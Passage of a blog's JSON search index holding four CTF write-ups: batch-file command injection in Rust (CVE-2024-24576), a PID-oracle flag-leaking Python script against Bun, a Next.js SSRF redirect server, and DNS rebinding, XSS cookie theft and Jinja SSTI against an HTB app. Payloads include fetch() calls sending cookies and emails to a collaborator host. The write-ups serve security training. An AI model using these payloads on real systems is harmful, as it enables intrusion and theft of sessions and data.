\u003ccode\u003ecorrect\u003c/code\u003e.\u003c/p\u003e","title":"CyberSpace CTF 2024 Quiz"},{"content":"Source Code Analysis Upon inspecting the code, we find that there\u0026rsquo;s /ai/run path that sounds like it could let us execute something.\nIt\u0026rsquo;s \u0026ldquo;guarded\u0026rdquo; by middleware that inspects whether host in the uri or the request header \u0026lsquo;host\u0026rsquo; starts with 127.0.01.\nAfterwards, the execution is passed to handle_cmd which can execute one of 6 commands. For us, the intereting ones are displaying env vars\nAnd running a .bat script with an argument passed by us.\nSpoofing localhost We can trivially bypass the middleware check by sending a request with a header Host: 127.0.0.1.\nCommand Injection using BatBadBut \u0026amp; CVE-2024-24576 The are 2 important rules that we\u0026rsquo;ll exploit:\nWindows CreateProcess function implicitly spawns cmd.exe to execute batch files, cmd.exe expands variables before doing any other parsing. We can see in the source code that our arg is passed as a single argument to the command. However, due to the fact that all arguments to the spawned process are passed a single string in the Windows API and Rust can\u0026rsquo;t escape arguments in all cases we can achieve command injection. The passed command looks like this .\\\\scripts\\\\ping.bat \u0026quot;{ARG}\u0026quot; where {ARG} is input controlled by us. In order to achieve CI, we need to escape out of \u0026quot;\u0026quot; and pass \u0026amp; followed by our command, which is then going to be followed by the closing \u0026quot; of the argument.\nFirst, let\u0026rsquo;s figure out how to pass \u0026quot; to the command. As we saw in the source code, we can\u0026rsquo;t pass it directly because it\u0026rsquo;s blacklisted. However, cmd.exe will parse envvars before execution. Furthermore, we can get a substring of any environment variable. Let\u0026rsquo;s check what\u0026rsquo;s available using /ai/run?cmd=env .\nCARGO_PKG_DESCRIPTION contains quotation marks. We can get single \u0026quot; using (url escaped) %25CARGO_PKG_DESCRIPTION:~364,-140%25. Now, let\u0026rsquo;s input \u0026quot;\u0026amp;dir as our arg. This will make the resulting call .\\\\scripts\\\\ping.bat \u0026quot;\u0026quot;\u0026amp;dir \u0026quot; (Notice space at the end, so we don\u0026rsquo;t end up with \u0026amp;dir\u0026quot; instead). URL encoded and using an envvar substring for \u0026quot; this will be GET /ai/run?cmd=ping2\u0026amp;arg=%25CARGO_PKG_DESCRIPTION:~364,-140%25%26dir%20.\nSuccess! Now we can substitute type flag.txt in place of dir to read the flag content.\nFinal Thoughts I saw some people wrongly assume this is a CI in the PING command in the .bat script, but this is not the case (you can try echoing variables available in the script and see they\u0026rsquo;re not available).\nReferences https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/ https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#bypass-char-blacklisting ","permalink":"http://localhost:1313/posts/crewctf-2024-malkonkordo/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eUpon inspecting the code, we find that there\u0026rsquo;s \u003ccode\u003e/ai/run\u003c/code\u003e path that sounds like it could let us execute something.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"admin-route.png\" alt=\"Admin route\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eIt\u0026rsquo;s \u0026ldquo;guarded\u0026rdquo; by middleware that inspects whether host in the uri or the request header \u0026lsquo;host\u0026rsquo; starts with \u003ccode\u003e127.0.01\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"middleware-localhost.png\" alt=\"Middleware localhost\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAfterwards, the execution is passed to \u003ccode\u003ehandle_cmd\u003c/code\u003e which can execute one of 6 commands. For us, the intereting ones are displaying env vars\u003c/p\u003e","title":"CrewCTF 2024 Malkonkordo"},{"content":"Initial Inspection There\u0026rsquo;s no souce code provided for the challenge. The only thing we\u0026rsquo;re given to work with is a website that executes our input code presumably using Bun.\nAfter playing around with it for a bit we know that it\u0026rsquo;s Bun, since the Bun variable is available and allows us to call different methods.\nMore Recon There are quite a few limitations to our code:\nBun.spawnSync function appears to be overwritten with a WAF message, WAF blocks our input from the POST body if it\u0026rsquo;s too long (I didn\u0026rsquo;t count it, but it\u0026rsquo;s about ~30 chars give or take), We can\u0026rsquo;t call await directly, Even though we can call Bun.spawn, we seemingly can\u0026rsquo;t write anywhere (tried /tmp and /dev/shm), There\u0026rsquo;s no outside network connectivity. However, we\u0026rsquo;re able to confirm that the flag is in /flag.txt by running Bun.file('/flag.txt').size.\nPID Oracle First, let\u0026rsquo;s get around around the input length limitation. To achieve this, we\u0026rsquo;ll move our payload to A header and execute it using \u0026quot;eval(request.headers.get('a')).\nBun.spawn is available, and even though we:\ncan\u0026rsquo;t access its result directly since it\u0026rsquo;s async, can\u0026rsquo;t make a network call to our webhook, can\u0026rsquo;t write anywhere. We can get the PID of the spawned process syncronously.\nOur plan is the following: we\u0026rsquo;ll spawn a command that\u0026rsquo;ll check if nth character of /flag.txt is equal to some character. If it is, we\u0026rsquo;ll spawn more processes. This will make our next call result have a significantly higher PID, since the processes have their PIDs assigned incrementally. We\u0026rsquo;ll check the difference of the resulting PIDs between calls to leak the flag content. This approach is prone to interference from others processes being started, but since we have our own instance for the challenge I haven\u0026rsquo;t run into any problems with it. Here\u0026rsquo;s my code to leak the flag:\nimport requests import string import time url = \u0026#34;https://2ca80b849337494b5275bf11.deadsec.quest/run\u0026#34; headers_template = { \u0026#34;Host\u0026#34;: \u0026#34;2ca80b849337494b5275bf11.deadsec.quest\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;https://2ca80b849337494b5275bf11.deadsec.quest\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;https://2ca80b849337494b5275bf11.deadsec.quest/\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.9\u0026#34;, \u0026#34;Priority\u0026#34;: \u0026#34;u=1, i\u0026#34; } payload = {\u0026#34;code\u0026#34;: \u0026#34;eval(request.headers.get(\u0026#39;a\u0026#39;))\u0026#34;} last_result = None flag_text = \u0026#39;DEAD{\u0026#39; character_set = string.ascii_letters + string.digits + \u0026#39;\u0026#39;.join( c for c in string.punctuation if c not in [\u0026#34;\u0026#39;\u0026#34;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;]) last_char = \u0026#39;\u0026#39; pid_diff_threshold = 7 for i in range(6, 60): for j in character_set: command = f\u0026#39;[ \u0026#34;$(head -c {i} /flag.txt | tail -c 1)\u0026#34; == \u0026#34;{j}\u0026#34; ] \u0026amp;\u0026amp; (sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp;)\u0026#39; headers = headers_template.copy() headers[\u0026#34;A\u0026#34;] = f\u0026#34;const command = \u0026#39;{command}\u0026#39;;let s=Bun.spawn({{cmd: [\u0026#39;bash\u0026#39;, \u0026#39;-c\u0026#39;, command]}});s.pid\u0026#34; response = requests.post(url, headers=headers, json=payload) if response.status_code == 200: response_json = response.json() result = response_json.get(\u0026#34;result\u0026#34;) print(f\u0026#34;|Current flag: {flag_text} | i: {i}, j: {j}, Result: {result}\u0026#34;) if last_result is not None and abs(result - last_result) \u0026gt; pid_diff_threshold: flag_text = flag_text + last_char print(f\u0026#39;Found {i}: {last_char}, diff: {abs(result - last_result)}\u0026#39;) last_result = result with open(\u0026#39;results.txt\u0026#39;, \u0026#39;a\u0026#39;) as file: file.write(f\u0026#34;{i}, {last_char}\\n\u0026#34;) file.flush() break last_result = result last_char = j else: print(f\u0026#34;Request failed for i: {i}, j: {j} with status code: {response.status_code}\u0026#34;) time.sleep(0.3) print(f\u0026#34;Flag: {flag_text}\u0026#34;) The command \u0026quot;$(head -c {i} /flag.txt | tail -c 1)\u0026quot; == \u0026quot;{j}\u0026quot; ] \u0026amp;\u0026amp; (sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp; sleep 10 \u0026amp;) will spawn a few simple processes with sleep 10 if the char in /flag.txt matches our guess. My manual testing showed me that the PIDs incremented by 4 if our last guess was wrong, and by 10 if our last guess was right. That\u0026rsquo;s why I decided to set pid_diff_threshold = 7 in the middle of these 2 values. The loop range for i in range(6, 60): goes from 6 since we know the first chars are DEAD{ and up to 59 since that\u0026rsquo;s the flag size we retrieved earlier (the last char could either be a newline or } but we\u0026rsquo;ll be able to guess it anyway). We save each result to results.txt for manual inspection if anything goes bad. Here\u0026rsquo;s the script running:\nFinal Thoughts The final flag was DEAD{BunT1m3_Fun_T1m3_Y0u_C4n_4lw4y$_Run_4$ync_1n$1d3_$ync} which indicates this is an unintended solution. PID oracle would be way more difficult on a shared instance, but thankfully each team had their own instancer and there was no problem making this work. Based on the amount of solutions (11), this was the most difficult web challenge in the CTF.\n","permalink":"http://localhost:1313/posts/deadsecctf-2024-buntime/","summary":"\u003ch2 id=\"initial-inspection\"\u003eInitial Inspection\u003c/h2\u003e\n\u003cp\u003eThere\u0026rsquo;s no souce code provided for the challenge. The only thing we\u0026rsquo;re given to work with is a website that executes our input code presumably using Bun.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"buntime-website.png\" alt=\"Buntime website\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAfter playing around with it for a bit we know that it\u0026rsquo;s Bun, since the \u003ccode\u003eBun\u003c/code\u003e variable is available and allows us to call different methods.\u003c/p\u003e\n\u003ch2 id=\"more-recon\"\u003eMore Recon\u003c/h2\u003e\n\u003cp\u003eThere are quite a few limitations to our code:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eBun.spawnSync\u003c/code\u003e function appears to be overwritten with a WAF message,\u003c/li\u003e\n\u003cli\u003eWAF blocks our input from the POST body if it\u0026rsquo;s too long (I didn\u0026rsquo;t count it, but it\u0026rsquo;s about ~30 chars give or take),\u003c/li\u003e\n\u003cli\u003eWe can\u0026rsquo;t call \u003ccode\u003eawait\u003c/code\u003e directly,\u003c/li\u003e\n\u003cli\u003eEven though we can call \u003ccode\u003eBun.spawn\u003c/code\u003e, we seemingly can\u0026rsquo;t write anywhere (tried \u003ccode\u003e/tmp\u003c/code\u003e and \u003ccode\u003e/dev/shm\u003c/code\u003e),\u003c/li\u003e\n\u003cli\u003eThere\u0026rsquo;s no outside network connectivity.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHowever, we\u0026rsquo;re able to confirm that the flag is in \u003ccode\u003e/flag.txt\u003c/code\u003e by running \u003ccode\u003eBun.file('/flag.txt').size\u003c/code\u003e.\u003c/p\u003e","title":"DeadSec CTF 2024 Buntime"},{"content":"Initial Code Analysis Upon inspecting the code, we discovered that the frontend application is running Next.js 14.1.0. This version is vulnerable to SSRF https://nvd.nist.gov/vuln/detail/CVE-2024-34351.\nWe also notice the flag.txt file is copied to /usr/share/nginx/html/flag.txt in the backend app, meaning it\u0026rsquo;s exposed via backend/flag.txt inside the docker network.\nWe\u0026rsquo;ll perform an SSRF to make the frontend application send a request to the backend application /flag.txt and send it back to us.\nRedirect Action The CVE is pretty straightforward. First, we need to find a Next.js redirect action that\u0026rsquo;ll allow us to perform it. There are only 2 in the application: one is redirect(\u0026rsquo;/admin\u0026rsquo;); upon successful login as admin and the other one is redirect(\u0026quot;/login\u0026quot;); upon successful logout. We can\u0026rsquo;t reach redirect(\u0026rsquo;/admin\u0026rsquo;); because that would require us to guess an admin password generated randomly on each call, however the logout action is available even if the user isn\u0026rsquo;t logged in.\nRedirect Server The next step to performing the attack is setting up a redirect server. For this purpose, we write this Python code and save it as server.py:\nfrom http.server import BaseHTTPRequestHandler, HTTPServer class RedirectHandler(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header(\u0026#39;Location\u0026#39;, \u0026#39;http://backend/flag.txt\u0026#39;) self.end_headers() def do_HEAD(self): self.send_response(200) self.send_header(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/x-component\u0026#39;) self.end_headers() def run(server_class=HTTPServer, handler_class=RedirectHandler, port=80): server_address = (\u0026#39;\u0026#39;, port) httpd = server_class(server_address, handler_class) print(f\u0026#34;Server running at http://localhost:{port}/\u0026#34;) httpd.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: run() 2 things to note here:\nWe need to answer the preflight HEAD request with Content-Type: text/x-component for the Next.js app to make the following GET request, On the GET request, we do a 302 redirect to http://backend/flag.txt which will make the frontend app send a request to it and return us the result. These steps are based on the CVE writeup at https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps.\nWe launch our python script with python3 server.py. We\u0026rsquo;ll expose our local instance globally by using https://localhost.run/. We copy the address that has been assigned to us.\nExploitation Finally, we\u0026rsquo;re ready to connect all the pieces. Let\u0026rsquo;s launch Burp, navigate to /logout, and click the logout button.\nIn Burp history, let\u0026rsquo;s repeat the POST /logout, replacing Origin and Host with our redirect server address.\nAs we can see, we successfully performed the exploitation and received the flag. We ran the attack against a local instance, but there\u0026rsquo;s no difference in exploitation against a remote one. We can also check our server logs to confirm that the app made a HEAD request followed by a GET request.\nReferences https://nvd.nist.gov/vuln/detail/CVE-2024-34351 https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps ","permalink":"http://localhost:1313/posts/uiuctf-2024-log-action/","summary":"\u003ch2 id=\"initial-code-analysis\"\u003eInitial Code Analysis\u003c/h2\u003e\n\u003cp\u003eUpon inspecting the code, we discovered that the frontend application is running Next.js 14.1.0. This version is vulnerable to SSRF \u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34351\"\u003ehttps://nvd.nist.gov/vuln/detail/CVE-2024-34351\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"nextjs-version.png\" alt=\"Next.js version\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe also notice the \u003cem\u003eflag.txt\u003c/em\u003e file is copied to \u003cem\u003e/usr/share/nginx/html/flag.txt\u003c/em\u003e in the backend app, meaning it\u0026rsquo;s exposed via \u003cem\u003ebackend/flag.txt\u003c/em\u003e inside the docker network.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"nginx-flag.png\" alt=\"Nginx flag\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe\u0026rsquo;ll perform an SSRF to make the frontend application send a request to the backend application \u003cem\u003e/flag.txt\u003c/em\u003e and send it back to us.\u003c/p\u003e","title":"UIUCTF 2024 Log Action"},{"content":"First Steps We analyze the code and notice the email page will only show emails addressed to test@email.htb.\nWe create a user with the email test@email.htb and confirm the registration by visiting the link from an email.\nDNS Rebinding to Activate an Internal User Upon further code inspection, we found out that users who sign up with an email hosted at apexsurvive.htb will be marked as internal users.\nThere\u0026rsquo;s an /external API endpoint that can be used for an open redirect.\nThe emails are served by Mailhog running on port 9000 and can be internally retrieved by using the /api/v2/messages endpoint.\nWe create a user asdf@apexsurvive.htb.\nWe log in and request a verification email. It won\u0026rsquo;t appear in emails on the website.\nWe\u0026rsquo;ll use the /external endpoint for an open redirect to our controlled website and then do DNS rebinding to fetch emails from Mailhog running on port 9000 and get the confirmation email for the internal user. To do this, we\u0026rsquo;ll set up an EC2 instance with a public IP address and then add a DNS NS record for it (keep in mind the dot at the end):\nWe have to allow incoming traffic from ports UDP 53 (for DNS) and TCP 9000 (for the HTTP server) at minimum. We configure the security group of our EC2 instance as following.\nOn the instance, we\u0026rsquo;ll run https://github.com/mogwailabs/DNSrebinder to change the resolution of my domain from EC2 public IP address to 127.0.0.1 after a moment:\nsudo python3 dnsrebinder.py --domain dynamic.mywebsite.xyz. --rebind 127.0.0.1 --ip \u0026lt;website-public-ip\u0026gt; --counter 1 --udp --ttl 1 We\u0026rsquo;ll also run an HTTP server on it serving index.html that keeps fetching /api/v2/messages for Mailhog emails and then sends them back to us. Remember it has to be on the same origin (port 9000).\nsudo python3 -m http.server 9000 index.html served by the HTTP server:\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; (function () { var axhr = new XMLHttpRequest(); axhr.open('GET', 'http://myburpcollab.oastify.com?start=start'); axhr.send() var interval = setInterval(function () { var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://dynamic.mywebsite.xyz:9000/api/v2/messages', false); xhr.onload = function () { if (xhr.status != 200) { return; } var xhr2 = new XMLHttpRequest(); xhr2.open('GET', `http://myburpcollab.oastify.com?msgs=${btoa(this.responseText)}`); xhr2.send(); }; xhr.send() }, 200) })(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; The script keeps fetching http://dynamic.mywebsite.xyz:9000/api/v2/messages in short intervals. which is on the same origin. After a while our DNS rebinder should switch from the EC2 IP address to localhost. Then, the script will successfully fetch the emails and send them back to us in base64.\nWe log in as test@email.htb and report:\n../external?url=http://dynamic.mywebsite.xyz:9000/ We notice how after a short moment our DNS server starts resolving our domain to 127.0.0.1 instead of our public IP.\nIt might take about 1 minute before the domain resolution is updated to 127.0.0.1. The first callback after the one with query parameter start=start one contains base64 encoded emails from Mailhog API. We decode them and get the confirmation link for the internal user.\nStored XSS to Steal the Session Cookie From the Admin As an internal user, we now can add products. In /application/templates/product.html we notice that the product.note (Product manual) from an input controlled by us is not sanitized and allows us to escape JS backticks.\nWe add any new product and in the product manual we put in:\n`;fetch(\u0026quot;https://myburpcollab.oastify.com/xss?c=\u0026quot;+document.cookie);let x=` We double-check we escaped JS backticks after adding the product:\nAfter we create it, we make the admin visit it by reporting its assigned product number. We take the admin session cookie from the callback.\nLeveraging a Race Condition for SSTI Leading to RCE As an admin, we now can add PDF contracts. We notice that:\nthe file is always saved to the same location before checking it‚Äôs a PDF, we can save the file anywhere by path traversal using ‚Äú..‚Äù in the filename, the PDF check takes the temporary file from the file system, not directly from the request. As a result, there‚Äôs a race condition between saving the temp file and checking that it‚Äôs a PDF.\nWe prepare 2 files:\na small PDF,\na Jinja template that‚Äôll read out the flag:\nResult {{ self.__init__.__globals__.__builtins__.__import__('os').system('/readflag \u0026gt; /app/application/static/images/flag.txt') }} We upload both and add them to a burp repeater group like so:\nWe try sending them multiple times using ‚ÄúSend group (parallel)‚Äù. We can play around with the number of PDF/Jinja template requests in the group. We watch out for message: Contract added in a response to a Jinja template upload. We check for it by refreshing any product page multiple times. If we see our payload, the flag is available under /static/images/flag.txt.\nReferences https://unit42.paloaltonetworks.com/dns-rebinding/ https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ https://portswigger.net/research/smashing-the-state-machine ","permalink":"http://localhost:1313/posts/htb-ca-2024-apexsurvive/","summary":"\u003ch2 id=\"first-steps\"\u003eFirst Steps\u003c/h2\u003e\n\u003cp\u003eWe analyze the code and notice the email page will only show emails addressed to \u003cem\u003e\u003ca href=\"mailto:test@email.htb\"\u003etest@email.htb\u003c/a\u003e\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"test-email.png\" alt=\"EmailCode\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe create a user with the email \u003cem\u003e\u003ca href=\"mailto:test@email.htb\"\u003etest@email.htb\u003c/a\u003e\u003c/em\u003e and confirm the registration by visiting the link from an email.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"verify-email-1.png\" alt=\"Verify email 1\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"verify-email-2.png\" alt=\"Verify email 2\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"dns-rebinding-to-activate-an-internal-user\"\u003eDNS Rebinding to Activate an Internal User\u003c/h2\u003e\n\u003cp\u003eUpon further code inspection, we found out that users who sign up with an email hosted at \u003cem\u003eapexsurvive.htb\u003c/em\u003e will be marked as internal users.\u003c/p\u003e","title":"HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup"}]